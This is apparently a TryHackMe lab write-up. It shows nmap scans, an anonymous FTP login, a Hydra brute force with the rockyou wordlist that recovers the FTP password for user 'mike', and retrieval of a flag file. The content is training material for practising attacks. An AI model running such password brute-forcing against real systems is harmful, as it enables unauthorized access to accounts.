## FTP

### nmap
```
┌──(yuu㉿kali)-[~/vpn]
└─$ nmap -Pn -sS -T4 -F 10.10.180.110
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 06:46 JST
Nmap scan report for 10.10.180.110
Host is up (0.36s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds

┌──(yuu㉿kali)-[~/vpn]
└─$ nmap -sV -p 21 10.10.180.110
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 06:54 JST
Nmap scan report for 10.10.180.110
Host is up (0.40s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
Service Info: Host: Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
```

### ftp
```
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ftp 10.10.180.110
Connected to 10.10.180.110.
220 Welcome to the administrator FTP service.
Name (10.10.180.110:yuu): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32202|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
226 Directory send OK.
ftp> get PUBLIC_NOTICE.txt
local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
229 Entering Extended Passive Mode (|||33640|)
150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
100% |*************************************************************************************************************|   353        2.90 MiB/s    00:00 ETA
226 Transfer complete.
353 bytes received in 00:00 (0.66 KiB/s)
ftp> exit
221 Goodbye.

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ls
id_rsa  nmap2.txt  nmap3.txt  nmap.txt  nmap_vuln.txt  PUBLIC_NOTICE.txt

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ cat PUBLIC_NOTICE.txt
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available
over the weekend- we will be
carrying out routine system
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike
```

### hydra
```
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ hydra -f -l mike -P /usr/share/wordlists/rockyou.txt 10.10.180.110 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-08 07:51:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.180.110:21/
[21][ftp] host: 10.10.180.110   login: mike   password: password
[STATUS] attack finished for 10.10.180.110 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-08 07:51:46
```

### ftp
```
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ ftp 10.10.180.110
Connected to 10.10.180.110.
220 Welcome to the administrator FTP service.
Name (10.10.180.110:yuu): mike
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42525|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
226 Directory send OK.
ftp> get ftp.txt
local: ftp.txt remote: ftp.txt
229 Entering Extended Passive Mode (|||29828|)
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
100% |*************************************************************************************************************|    26      906.80 KiB/s    00:00 ETA
226 Transfer complete.
26 bytes received in 00:00 (0.08 KiB/s)
ftp> pwd
Remote directory: /home/mike
ftp> cat ftp.txt
?Invalid command.
ftp> exit
221 Goodbye.

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ cat ftp.txt
THM{y0u_g0t_th3_ftp_fl4g}
```
